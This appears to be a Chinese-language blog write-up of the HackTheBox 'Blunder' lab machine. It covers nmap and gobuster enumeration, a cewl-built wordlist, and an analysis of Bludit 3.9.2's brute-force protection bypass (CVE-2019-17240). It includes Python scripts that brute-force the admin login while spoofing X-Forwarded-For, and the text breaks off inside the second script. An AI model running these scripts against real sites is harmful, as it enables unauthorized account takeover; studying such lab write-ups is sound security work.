<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Bantian">





<title>HackTheBox-Blunder靶机渗透笔记 | Bantian</title>



    <link rel="icon" href="/my.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 4.2.1"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Archives</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Archives</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">HackTheBox-Blunder靶机渗透笔记</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">2020-12-12&nbsp;&nbsp;22:35:28</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/0.png" alt="0"></p>
<h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><ul>
<li>枚举</li>
<li>Metasploit利用</li>
<li>CMS漏洞利用</li>
<li>sudo提权</li>
</ul>
<p>这个靶机还是比较简单的，入侵点是已经公开的Bludit CMS漏洞，而且这个CMS的漏洞我之前复现过。这篇文章就记录下这个靶机的渗透过程。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>首先第一步信息收集，直接nmap扫描。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ nmap -sC -sV -A 10.10.10.191</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-10-24 11:23 EDT</span><br><span class="line">Nmap scan report for 10.10.10.191</span><br><span class="line">Host is up (0.22s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE  SERVICE VERSION</span><br><span class="line">21&#x2F;tcp closed ftp</span><br><span class="line">80&#x2F;tcp open   http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: Blunder</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)        </span><br><span class="line">|_http-title: Blunder | A blunder of interesting facts</span><br><span class="line">Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Infomir MAG-250 set-top box (89%), Ubiquiti AirMax NanoStation WAP (Linux </span><br><span class="line">2.6.32) (89%), Ubiquiti AirOS 5.5.9 (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.3 (89%), Linux 2.6.32 - 3.1 (88%), Linux 3.7 (88%), Netgear RAIDiator 4.2.21 (Linux 2.6.37) (88%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 21&#x2F;tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   222.27 ms 10.10.14.1</span><br><span class="line">2   222.36 ms 10.10.10.191</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 36.94 seconds</span><br></pre></td></tr></table></figure>

<p>发现开放了ftp服务和http服务，其中ftp服务的状态是closed。</p>
<p>访问<a href="http://10.10.10.191" target="_blank" rel="noopener">http://10.10.10.191</a> ，是一个网站：</p>
<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/1.png" alt="1"></p>
<p>用gobuster扫描下站点的目录和文件，可以限制扫描的文件名，比如比较常见的txt, pdf和php。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:~&#x2F;htb-tools&#x2F;gobuster# gobuster dir -u http:&#x2F;&#x2F;10.10.10.191 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;common.txt -x txt,php,pdf</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:                     http:&#x2F;&#x2F;10.10.10.191</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;common.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster&#x2F;3.1.0</span><br><span class="line">[+] Extensions:              txt,php,pdf</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;10&#x2F;25 07:30:39 Starting gobuster in directory enumeration mode</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.hta.php             (Status: 403) [Size: 277]</span><br><span class="line">&#x2F;.hta                 (Status: 403) [Size: 277]</span><br><span class="line">&#x2F;.hta.pdf             (Status: 403) [Size: 277]</span><br><span class="line">&#x2F;.hta.txt             (Status: 403) [Size: 277]</span><br><span class="line">&#x2F;.htaccess.php        (Status: 403) [Size: 277]</span><br><span class="line">&#x2F;.htaccess.pdf        (Status: 403) [Size: 277]</span><br><span class="line">&#x2F;.htaccess            (Status: 403) [Size: 277]</span><br><span class="line">&#x2F;.htaccess.txt        (Status: 403) [Size: 277]</span><br><span class="line">&#x2F;.htpasswd            (Status: 403) [Size: 277]</span><br><span class="line">&#x2F;.htpasswd.txt        (Status: 403) [Size: 277]</span><br><span class="line">&#x2F;.htpasswd.php        (Status: 403) [Size: 277]</span><br><span class="line">&#x2F;.htpasswd.pdf        (Status: 403) [Size: 277]</span><br><span class="line">&#x2F;0                    (Status: 200) [Size: 7562]</span><br><span class="line">&#x2F;about                (Status: 200) [Size: 3281]</span><br><span class="line">&#x2F;admin                (Status: 301) [Size: 0] [--&gt; http:&#x2F;&#x2F;10.10.10.191&#x2F;admin&#x2F;]</span><br><span class="line">&#x2F;cgi-bin&#x2F;             (Status: 301) [Size: 0] [--&gt; http:&#x2F;&#x2F;10.10.10.191&#x2F;cgi-bin]</span><br><span class="line">&#x2F;install.php          (Status: 200) [Size: 30]</span><br><span class="line">&#x2F;LICENSE              (Status: 200) [Size: 1083]</span><br><span class="line">&#x2F;robots.txt           (Status: 200) [Size: 22]</span><br><span class="line">&#x2F;robots.txt           (Status: 200) [Size: 22]</span><br><span class="line">&#x2F;server-status        (Status: 403) [Size: 277]</span><br><span class="line">&#x2F;todo.txt             (Status: 200) [Size: 118]</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;10&#x2F;25 07:32:03 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>从扫描结果发现了<code>/admin</code>目录，访问一看，是bludit CMS的登录入口：</p>
<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/7.png" alt="7"></p>
<p>右键查看源码发现了当前的版本是<code>3.9.2</code>：</p>
<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/2.png" alt="2"></p>
<p>但是目前还没有账户信息，还有<code>robots.txt</code>和<code>todo.txt</code>文件，<code>robots.txt</code>中就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Allow: &#x2F;</span><br></pre></td></tr></table></figure>

<p>但是查看<code>todo.txt</code>发现了一些待完成事项：</p>
<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/3.png" alt="3"></p>
<p>其中包含一条信息是通知用户fergus为新的blog添加图片，说明有一个名为<code>fergus</code>的用户。但目前还缺少密码，那就利用cewl爬取网站获取关键信息来创建一个密码字典。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:~# cewl 10.10.10.191 &gt; wordlist.txt</span><br><span class="line">root@vultr:~# cat wordlist.txt </span><br><span class="line">CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https:&#x2F;&#x2F;digi.ninja&#x2F;)</span><br><span class="line">the</span><br><span class="line">Load</span><br><span class="line">Plugins</span><br><span class="line">and    </span><br><span class="line">......</span><br><span class="line">best</span><br><span class="line">fictional</span><br><span class="line">character</span><br><span class="line">RolandDeschain</span><br><span class="line">Dark</span><br><span class="line">tower</span><br><span class="line">awards</span><br><span class="line">contribution</span><br><span class="line">entire</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>用burp抓个包丢到intruder模块进行爆破：</p>
<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/6.png" alt="6"></p>
<p>发现所有的返回的响应数据包长度都是419，返回的状态码都是301：</p>
<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/5.png" alt="5"></p>
<p>。。。。。。</p>
<p>在尝试了几次登录密码之后，发现IP被ban了。</p>
<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/4.png" alt="4"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="绕过brute-force保护机制"><a href="#绕过brute-force保护机制" class="headerlink" title="绕过brute-force保护机制"></a>绕过brute-force保护机制</h4><p>那当务之急肯定是要先绕过密码尝试限制，搜索exploit-db和cve.mitre.org发现bludit 3.9.2及其之前版本中存在一个brute-force保护机制绕过漏洞，CVE-2019-17240：<br><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/8.png" alt="8"></p>
<p>漏洞代码在文件<code>bl-kernel/security.class.php</code>中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserIp</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) &#123;</span><br><span class="line">			$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">		&#125; <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>)) &#123;</span><br><span class="line">			$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$ip = getenv(<span class="string">'REMOTE_ADDR'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $ip;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>在获取IP地址的时候，bludit会先拿HTTP_X_FORWARDED_FOR 的值，其次拿HTTP_CLIENT_IP，最后才是REMOTE_ADDR。</p>
<ul>
<li>REMOTE_ADDR 是服务器端根据TCP数据包中的IP指定的。如果从客户端到服务端中间没有任何代理，那么Web服务器如Ngnix，Apache等就认为客户端的IP地址是REMOTE_ADDR，如果存在代理转发HTTP请求，Web服务器会把最后一次代理服务器的IP地址设为REMOTE_ADDR。<strong>这个值是不可伪造的</strong>。</li>
<li>HTTP_X_FORWARDED_FOR对应HTTP请求头中的<code>x-forwarded-for</code>字段。因为代理之后就无法获取用户的真实IP，因此X-Forwarded-For就产生了，这是一个非正式协议。在请求转发到代理时，代理会在HTTP请求头中加入一个X-Forwarded-For字段，将该值设置为连接该代理的客户端IP（也就是真实的客户端IP），这样服务端就能获取到真实的IP地址，这是设置X-Forwarded-For的本意。</li>
<li>HTTP_CLIENT_IP和HTTP_X_FORWARDED_FOR一样，都是可以伪造的。</li>
</ul>
<p>bludit在patch中的修复方式就是仅从REMOTE_ADDR读取客户端ip。<img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/9.png" alt="9"></p>
<p>我在本地的环境搭了Bludit 3.9.2进行验证：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">'manual to this script'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--url'</span>, type=str, default=<span class="literal">None</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--username'</span>, type=str, default=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">host = args.url</span><br><span class="line">login_url = args.url + <span class="string">"/bludit-3.9.2/admin/"</span></span><br><span class="line">username = args.username</span><br><span class="line">wordlist = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    wordlist.append(<span class="string">'Password&#123;i&#125;'</span>.format(i=i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> passwd <span class="keyword">in</span> wordlist:</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_page = session.get(login_url)</span><br><span class="line">    <span class="comment"># &lt;input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="4ed768590a9fa7b70aaeb3a4aaec307b99d9b93f"&gt;</span></span><br><span class="line">    csrf_token = re.search(<span class="string">'input.+?name="tokenCSRF".+?value="(.+?)"'</span>, login_page.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'[*] Tyring: &#123;p&#125;'</span>.format(p = passwd))</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'X-Forwarded-For'</span>: <span class="string">'TemporaryIP'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: login_url</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: passwd,</span><br><span class="line">        <span class="string">'tokenCSRF'</span>: csrf_token,</span><br><span class="line">        <span class="string">'save'</span>: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    login_result = session.post(url=login_url, headers=headers, data=data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'location'</span> <span class="keyword">in</span> login_result.headers:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'/admin/dashboard'</span> <span class="keyword">in</span> login_result.headers[<span class="string">'location'</span>]:</span><br><span class="line">            print()</span><br><span class="line">            print(<span class="string">'SUCCESS: Password found!'</span>)</span><br><span class="line">            print(<span class="string">'Use &#123;u&#125; : &#123;p&#125; to login.'</span>.format(u=username, p=passwd))</span><br><span class="line">            print()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>尝试用同一个IP地址发起50次登录请求，被ban掉的IP地址存放在bl-content/databases/security.php文件中：</p>
<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/10.png" alt="10"></p>
<p>所以每次尝试用不同的X-Forwarded-For字段尝试登录就可以绕过brute-force防御机制。</p>
<p>对应脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">'manual to this script'</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--url'</span>, type=str, default=<span class="literal">None</span>)</span><br><span class="line">parser.add_argument(<span class="string">'--username'</span>, type=str, default=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">host = args.url</span><br><span class="line">login_url = args.url + <span class="string">"/admin/"</span></span><br><span class="line">username = args.username</span><br><span class="line">wordlist = []</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'wordlist.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    line = line.split(<span class="string">"\n"</span>)[<span class="number">0</span>]</span><br><span class="line">    wordlist.append(line.strip())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> passwd <span class="keyword">in</span> wordlist:</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_page = session.get(login_url)</span><br><span class="line">    <span class="comment"># &lt;input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="4ed768590a9fa7b70aaeb3a4aaec307b99d9b93f"&gt;</span></span><br><span class="line">    csrf_token = re.search(<span class="string">'input.+?name="tokenCSRF".+?value="(.+?)"'</span>, login_page.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'[*] Tyring: &#123;p&#125;'</span>.format(p = passwd))</span><br><span 